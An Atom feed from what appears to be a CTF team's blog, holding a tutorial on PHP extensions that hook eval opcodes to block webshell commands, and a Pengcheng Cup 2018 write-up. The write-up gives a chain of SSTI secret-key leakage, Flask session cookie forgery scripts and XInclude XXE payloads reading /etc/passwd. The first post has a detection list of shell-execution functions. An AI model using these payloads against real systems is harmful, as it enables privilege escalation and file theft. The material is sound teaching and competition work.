<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kn0ck&#39;s blog</title>
  
  <subtitle>一群CTF爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kctf.github.io/"/>
  <updated>2019-03-03T13:56:45.968Z</updated>
  <id>http://kctf.github.io/</id>
  
  <author>
    <name>kn0ck Team</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初探php拓展层面(一)</title>
    <link href="http://kctf.github.io/2019/03/03/php-extension-1/"/>
    <id>http://kctf.github.io/2019/03/03/php-extension-1/</id>
    <published>2019-03-03T13:27:55.000Z</published>
    <updated>2019-03-03T13:56:45.968Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发先知社区，文章链接：<a href="https://xz.aliyun.com/t/4214" target="_blank" rel="noopener">https://xz.aliyun.com/t/4214</a></p></blockquote><p>前段时间想写一个静态代码审计工具,需要对php扩展熟悉一些,那么自己从零开始接触这一块,如果有错误的地方,麻烦师傅们指正。</p><p>另外呢网上虽然有一些文章,但是感觉都不是特别细,对于刚入门的我来说有些难以理解,因此详细的记录下自己的学习过程。</p><a id="more"></a><p>我在mac环境上折腾了两天gdb,还是没折腾好,无奈选择docker,这里推荐一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hxer/php-debug/blob/master/Dockerfile</span><br></pre></td></tr></table></figure><p>这个dockerfile的vld和php版本不匹配,需要更换下低版本的vld。</p><p>启动命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -d --security-opt seccomp=unconfined -v /Users/p0desta/Desktop/code:/home php5-debug</span><br></pre></td></tr></table></figure><p><a name="ef5359c9"></a></p><h4 id="编写最简单的php扩展"><a href="#编写最简单的php扩展" class="headerlink" title="编写最简单的php扩展"></a>编写最简单的php扩展</h4><ul><li><p>在ext目录下执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=p0desta</span><br></pre></td></tr></table></figure></li><li><p>然后进入到扩展目录下,编辑config.m4文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">16 dnl PHP_ARG_ENABLE(foobar, whether to enable foobar support,</span><br><span class="line">17 dnl Make sure that the comment is aligned:</span><br><span class="line">18 dnl [  --enable-foobar           Enable foobar support])</span><br></pre></td></tr></table></figure></li></ul><p><br>删除第16-18行的注释</p><ul><li><p>然后去php_p0desta.h文件,添加函数声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(confirm_foobar_compiled);</span><br><span class="line">PHP_FUNCTION(p0desta);</span><br></pre></td></tr></table></figure></li><li><p>然后到p0desta.c中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const zend_function_entry p0desta_functions[] = &#123;</span><br><span class="line">PHP_FE(p0desta, NULL)</span><br><span class="line">PHP_FE(confirm_p0desta_compiled,NULL)/* For testing, remove later. */</span><br><span class="line">PHP_FE_END/* Must be the last line in p0desta_functions[] */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p><br>添加如下<code>PHP_FE(p0desta, NULL)</code></p><ul><li><p>然后到最底下编写函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(p0desta)</span><br><span class="line">&#123;</span><br><span class="line">php_printf(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后在当前目录下执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure --enable-p0desta --enable-debug</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li></ul><p>然后会在modules文件夹下生存<code>so</code>文件,在php.ini中添加拓展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=p0desta.so</span><br></pre></td></tr></table></figure><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g09d4l5yfuj30a0062t8y.jpg#align=left&amp;display=inline&amp;height=218&amp;originHeight=218&amp;originWidth=360&amp;status=done&amp;width=360" alt></p><p>然后就可以调用自写的函数。</p><p><a name="bbb46467"></a></p><h4 id="php代码的大致执行流程"><a href="#php代码的大致执行流程" class="headerlink" title="php代码的大致执行流程"></a>php代码的大致执行流程</h4><p>开始 -&gt; Scanning,将php代码转换为语言片段(Tokens) -&gt; Parsing,将tokens转化为简单而有意义的表达式 -&gt; Compilation,将表达式编译成opcode -&gt; Execution,顺次执行opcodes,从而实现php脚本的功能。</p><p><a name="b1f6dd04"></a></p><h4 id="hook最简单的opcode"><a href="#hook最简单的opcode" class="headerlink" title="hook最简单的opcode"></a>hook最简单的opcode</h4><p>关于一些宏的解释参考:<code>https://github.com/pangudashu/php7-internal/blob/master/7/hook.md</code></p><p>这里我使用<code>zend_set_user_opcode_handler</code>函数来hook <code>echo</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_set_user_opcode_handler(ZEND_ECHO, ppecho);</span><br></pre></td></tr></table></figure><p>主要原理是将对应的Zend op的handler函数替换成我们自己定义的来实现HOOK</p><p>首先我在扩展.h中定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_OPCODE_HANDLER_ARGS void</span></span><br><span class="line">PHP_FUNCTION(confirm_foobar_compiled);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ppecho</span><span class="params">(ZEND_OPCODE_HANDLER_ARGS)</span></span>;</span><br></pre></td></tr></table></figure><p>扩展.c中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINIT_FUNCTION(p_echo)</span><br><span class="line">&#123;</span><br><span class="line">/* If you have INI entries, uncomment these lines</span><br><span class="line">REGISTER_INI_ENTRIES();</span><br><span class="line">*/</span><br><span class="line">zend_set_user_opcode_handler(ZEND_ECHO, ppecho);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int ppecho(ZEND_OPCODE_HANDLER_ARGS)</span><br><span class="line">&#123;</span><br><span class="line">php_printf(&quot;hook success&quot;);</span><br><span class="line">return ZEND_USER_OPCODE_RETURN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果打算放行继续执行的话<code>return ZEND_USER_OPCODE_DISPATCH</code>,如果不继续执行的话<code>return ZEND_USER_OPCODE_RETURN</code></p><p>编译完之后看一下效果</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g09ov5zdttj30em05kmxm.jpg#align=left&amp;display=inline&amp;height=200&amp;originHeight=200&amp;originWidth=526&amp;status=done&amp;width=526" alt></p><p><a name="4b35f06d"></a></p><h4 id="Webshell简单防御初探"><a href="#Webshell简单防御初探" class="headerlink" title="Webshell简单防御初探"></a>Webshell简单防御初探</h4><p>关于一些PHP内核中的定义详情请参考<code>https://www.kancloud.cn/kancloud/php-internals/42755</code></p><p>这里我们暂时需要了解的有</p><ul><li><p>全局变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EG()、这个宏可以用来访问符号表，函数，资源信息和常量</span><br><span class="line">CG() 用来访问核心全局变量</span><br><span class="line">PG() PHP全局变量。我们知道php.ini会映射一个或者多个PHP全局结构。举几个使用这个宏的例子：PG(register_globals), PG(safe_mode), PG(memory_limit)</span><br><span class="line">FG() 文件全局变量。大多数文件I/O或相关的全局变量的数据流都塞进标准扩展出口结构。</span><br></pre></td></tr></table></figure></li><li><p>函数类型<br><br>Zend引擎将函数分为以下几个类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define ZEND_INTERNAL_FUNCTION 1</span><br><span class="line">#define ZEND_USER_FUNCTION 2 </span><br><span class="line">#define ZEND_OVERLOADED_FUNCTION 3</span><br><span class="line">#define ZEND_EVAL_CODE 4</span><br><span class="line">#define ZEND_OVERLOADED_FUNCTION_TEMPORARY 5</span><br></pre></td></tr></table></figure><ul><li><p>ZEND_USER_FUNCTION （用户函数:用户定义的函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ZEND_INTERNAL_FUNCTION (内部函数:由扩展、PHP内核、Zend引擎提供的内部函数)</p></li><li><p>变量函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="string">'print_r'</span>;</span><br><span class="line">$func(<span class="string">'i am print_r function.'</span>);</span><br></pre></td></tr></table></figure></li><li><p>匿名函数</p></li></ul></li><li>php7的_zend_execute_data<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> zend_op       *opline;           <span class="comment">/* executed opline                */</span></span><br><span class="line">zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">zval                *return_value;</span><br><span class="line">zend_function       *func;             <span class="comment">/* executed function              */</span></span><br><span class="line">zval                 This;             <span class="comment">/* this + call_info + num_args    */</span></span><br><span class="line">zend_execute_data   *prev_execute_data;</span><br><span class="line">zend_array          *symbol_table;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_EX_USE_RUN_TIME_CACHE</span></span><br><span class="line"><span class="keyword">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_EX_USE_LITERALS</span></span><br><span class="line">zval                *literals;         <span class="comment">/* cache op_array-&gt;literals       */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p>我们看一下如下代码的opcode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"system('whoami');"</span>);</span><br></pre></td></tr></table></figure><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g09pr975pmj31ci0s2gpv.jpg#align=left&amp;display=inline&amp;height=432&amp;originHeight=1010&amp;originWidth=1746&amp;status=done&amp;width=746" alt></p><p>我们hook掉<code>INCLUDE_OR_EVAL</code></p><p>修改<code>php_hook_eval.h</code>增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(confirm_foobar_compiled);</span><br><span class="line">static int HOOK_INCLUDE_OR_EVAL(ZEND_OPCODE_HANDLER_ARGS);</span><br><span class="line"># define ZEND_OPCODE_HANDLER_ARGS zend_execute_data *execute_data</span><br></pre></td></tr></table></figure><p>修改<code>hook_eval.c</code>增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static int HOOK_INCLUDE_OR_EVAL(ZEND_OPCODE_HANDLER_ARGS)</span><br><span class="line">&#123;</span><br><span class="line">zend_execute_data *tmp = &amp;execute_data;</span><br><span class="line">zend_op *opline = execute_data-&gt;opline;</span><br><span class="line">return ZEND_USER_OPCODE_DISPATCH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在<code>execute_data</code>中往下找调用的函数<code>system</code></p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0jpqxu5fgj32660fgdjz.jpg#align=left&amp;display=inline&amp;height=147&amp;originHeight=556&amp;originWidth=2814&amp;status=done&amp;width=746" alt></p><p>这个也就是操作数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string型变量比较特殊，因为内核在保存String型变量时，不仅保存了字符串的值，还保存了它的长度，所以它有对应的两种宏组合STRVAL和STRLEN，即：Z_STRVAL、Z_STRVAL_P、Z_STRVAL_PP与Z_STRLEN、Z_STRLEN_P、Z_STRLEN_PP。</span><br></pre></td></tr></table></figure><p>编写<code>HOOK_INCLUDE_OR_EVAL</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">static int HOOK_INCLUDE_OR_EVAL(ZEND_OPCODE_HANDLER_ARGS)</span><br><span class="line">&#123;</span><br><span class="line">zend_op *opline = execute_data-&gt;opline;</span><br><span class="line">zval *operands = opline-&gt;op1.zv;</span><br><span class="line">char *cmd = Z_STRVAL_P(operands);</span><br><span class="line">if(cmd)&#123;</span><br><span class="line">if((strstr(cmd, &quot;system&quot;)==NULL)&amp;&amp;(strstr(cmd, &quot;exec&quot;)==NULL)&amp;&amp;(strstr(cmd, &quot;shell_exec&quot;)==NULL)&amp;&amp;(strstr(cmd, &quot;passthru&quot;)==NULL)&amp;&amp;(strstr(cmd, &quot;roc_open&quot;)==NULL))&#123;</span><br><span class="line">return ZEND_USER_OPCODE_DISPATCH;</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> return ZEND_USER_OPCODE_RETURN;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return ZEND_USER_OPCODE_DISPATCH; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下执行流程</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g0jtsrsagdj326g0dwwpa.jpg#align=left&amp;display=inline&amp;height=132&amp;originHeight=500&amp;originWidth=2824&amp;status=done&amp;width=746" alt></p><p>当然,只hook掉<code>ZEND_INCLUDE_OR_EVAL</code>是很难防御的,比如说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&apos;echo `whoami`;&apos;);</span><br></pre></td></tr></table></figure><p>这种就必须再去hook <code>DO_FCALL</code></p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g0jtv6jfryj31dr0u0tob.jpg#align=left&amp;display=inline&amp;height=450&amp;originHeight=1080&amp;originWidth=1791&amp;status=done&amp;width=746" alt></p><p>为了不影响业务并且去做更好的防御,还需要更深入的研究。</p><p>参考:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://drops.xmd5.com/static/drops/web-7333.html</span><br><span class="line">https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发先知社区，文章链接：&lt;a href=&quot;https://xz.aliyun.com/t/4214&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4214&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;前段时间想写一个静态代码审计工具,需要对php扩展熟悉一些,那么自己从零开始接触这一块,如果有错误的地方,麻烦师傅们指正。&lt;/p&gt;
&lt;p&gt;另外呢网上虽然有一些文章,但是感觉都不是特别细,对于刚入门的我来说有些难以理解,因此详细的记录下自己的学习过程。&lt;/p&gt;
    
    </summary>
    
      <category term="web" scheme="http://kctf.github.io/categories/web/"/>
    
    
      <category term="php拓展" scheme="http://kctf.github.io/tags/php%E6%8B%93%E5%B1%95/"/>
    
      <category term="代码审计" scheme="http://kctf.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>鹏城杯2018WEB shadow题解</title>
    <link href="http://kctf.github.io/2019/02/12/2018-pcb-shadow/"/>
    <id>http://kctf.github.io/2019/02/12/2018-pcb-shadow/</id>
    <published>2019-02-12T15:30:43.000Z</published>
    <updated>2019-03-03T13:56:45.967Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天打完了鹏城杯，还是一脸懵逼，主办方疯狂放提示，选手疯狂懵逼。。。<br>我在一堆脑洞题之间还是看到了一道比较有意思的web题目，虽然最后也没出flag，但还是挺有感悟的。<br><a id="more"></a></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给你一个flask搭建的网站，除了登录注册之外也没发现什么功能， 注释里看到有<code>/upload</code>路径，但访问提示需要admin权限。又四处游荡发现几个js不存在，回显是：</p><p><img src="https://img.5am3.com/20190212154998561366780.png" alt="20190212154998561366780.png"></p><p>看到这里，应该是有404页面的SSTI漏洞了，但是试了几次发现无法直接命令执行，只好寻求来读一些内置变量，<code>config</code>和<code>self</code>都被禁了，读了<a href="https://blog.csdn.net/qq_33020901/article/details/83036927" target="_blank" rel="noopener">这位大佬的文章</a>。可知，可以通过<code>    </code>读到一些变量，其中<code></code>可以读到<code>SECRET_KEY</code></p><p><img src="https://img.5am3.com/20190212154998565995974.png" alt="20190212154998565995974.png"></p><p>这样我们就可以来伪造flask的cookie，获得admin权限了。通过访问<code></code>拿到cookie</p><p><img src="https://img.5am3.com/2019021215499856735385.png" alt="2019021215499856735385.png"></p><p>拆开看看里面有啥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=URLSafeTimedSerializer(<span class="string">"as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf"</span>, salt=<span class="string">"cookie-session"</span>,signer_kwargs=&#123;<span class="string">"key_derivation"</span>:<span class="string">"hmac"</span>,<span class="string">"digest_method"</span>:<span class="string">"sha1"</span>&#125;)</span><br><span class="line">data = s.loads(<span class="string">".eJw9kMFqg0AQhl-l7DkHXdNLIAfLWjGwI8oamb2INabu6qagkTQb8u4dcuhhYGDm-4b5H6w5z_0ysN25nZZ-wxpzYrsHe_tiOwa8uqHPPPqRqrgh1xZsctOqo07e0RaRdhjlabXN68yDxUCKg9G2irQaJu3KSdZILO2rOJQeRiQO0iLE-jiiS361jQPpjg55cUdOM5eF2sGQK-m1-L6jAqcFeilKA-Iw0H2PPOE6xQgUjFrJAES1Z88N65b53Fx_xv7y_wKhIaRVBOLToC1HwsNcfEySVxxIq9PSguhCmSYB1EkgbbaV8f6lM0vTnpwh2XVeKZpL63pSDmu7mJlt2Lr08ysu9s6ef3KlazU.XAOwLQ.q-Gin27oj8k69vvulgiayMpFKJs"</span>)</span><br><span class="line"><span class="keyword">print</span> (data)</span><br></pre></td></tr></table></figure><p><img src="https://img.5am3.com/20190212154998569398968.png" alt="20190212154998569398968.png"></p><p>可以看到这里<code>is_admin</code>是<code>False</code>,改成<code>True</code>再打包起来就行了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = s.dumps(&#123;<span class="string">'_fresh'</span>: <span class="keyword">True</span>, <span class="string">'_id'</span>: &#123;<span class="string">' b'</span>: <span class="string">'ZTM3ODI5NTdjYTIxN2I0YzU5ZjgzNjBmZjgwMDE5YzM3ODI0MzZhOTkwNzdmOWIyOTAzMWU5YzkxZDNmYmM5MGQyM2M4N2FkZDQ2NThlZmUyNzA5ZTUwMGVmZDI2NDE5ODZlM2NjNWQ0NmY5NmRlNTQwYjg2MmY0ZTgwYjBiNTI='</span>&#125;, <span class="string">'csrf_token'</span>: &#123;<span class="string">' b'</span>: <span class="string">'NWFkNmQ2OTgwZmU5ZGMyNWYxMTdiNzBhZDBiMTIxNjcxYjllZWM1Yw=='</span>&#125;, <span class="string">'is_admin'</span>: <span class="keyword">True</span>, <span class="string">'name'</span>: <span class="string">'huasir'</span>, <span class="string">'user_id'</span>: <span class="string">'5'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure></p><p>拿着这个去访问upload，然后可以上传文件。当然python直接上传貌似不能拿shell，试了几次发现上传XML文件有回显，但是上传常见的XXE payload会显示错误。</p><p><img src="https://img.5am3.com/20190212154998571710950.png" alt="20190212154998571710950.png"></p><p>参考<a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">这篇文章</a>可以看到用XInclude可以避开使用<code>ENTITY</code>关键字：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>回显<code>/etc/passwd</code>内容</p><p><img src="https://img.5am3.com/20190212154998573865102.png" alt="20190212154998573865102.png"></p><p>看到有个rq用户也有<code>bash</code>,读取其用户目录下的<code>.bash_history</code>可以看到flag文件的名字，遂构造payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///home/rq/f123333333ag"</span> <span class="attr">parse</span>=<span class="string">"text"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>flag:<br><img src="https://img.5am3.com/20190212154998575010135.png" alt="20190212154998575010135.png"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>一开始我失败的原因是我想用flask服务来得到cookie：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, escape, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'name'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello, &#123;&#125;\ncookie: &#123;&#125;'</span>.format(escape(session[<span class="string">'name'</span>]),request.cookies)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello, stranger\n'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/login")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">session[<span class="string">'csrf_token'</span>] = <span class="string">'IjQ1ZTgwOGU3YWY5YmZjOGUwM2U1MDQ1OTUxODI0MmRhNDQyYTM0OTci.XANzdg.ljY0IMuCAb2ovypjBa5OvzegdDs'</span></span><br><span class="line">    session[<span class="string">'_id'</span>] = <span class="string">'bc00ab0feca90420847a2fc0ea2d0491ee7177c453d037a041383b6f4b434304eae5fa0a220dc0111abd963bbcca5c466b6303b0afacabf8544523cdbc83e7c4'</span></span><br><span class="line">    session[<span class="string">'user_id'</span>] = <span class="string">'1'</span></span><br><span class="line">    session[<span class="string">'name'</span>] = <span class="string">'admin'</span></span><br><span class="line">    session[<span class="string">'is_admin'</span>] = <span class="keyword">True</span></span><br><span class="line">    session[<span class="string">'_fresh'</span>] = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Login success"</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>, debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><p>但是这样的cookie能进入/upload页面，但是一传文件就又反馈<code>only admin can use it</code>，结束后我又试了两次，又行了?_?….蜜汁，这样应该是没有影响的。<br>可能是因为我把flask服务改到一个页面里了？？/px<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'csrf_token'</span>] = <span class="string">'IjQ1ZTgwOGU3YWY5YmZjOGUwM2U1MDQ1OTUxODI0MmRhNDQyYTM0OTci.XANzdg.ljY0IMuCAb2ovypjBa5OvzegdDs'</span></span><br><span class="line">    session[<span class="string">'_id'</span>] = <span class="string">'bc00ab0feca90420847a2fc0ea2d0491ee7177c453d037a041383b6f4b434304eae5fa0a220dc0111abd963bbcca5c466b6303b0afacabf8544523cdbc83e7c4'</span></span><br><span class="line">    session[<span class="string">'user_id'</span>] = <span class="string">'5'</span></span><br><span class="line">    session[<span class="string">'name'</span>] = <span class="string">'huasir'</span></span><br><span class="line">    session[<span class="string">'is_admin'</span>] = <span class="keyword">True</span></span><br><span class="line">    session[<span class="string">'_fresh'</span>] = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'name'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello, &#123;&#125;\ncookie: 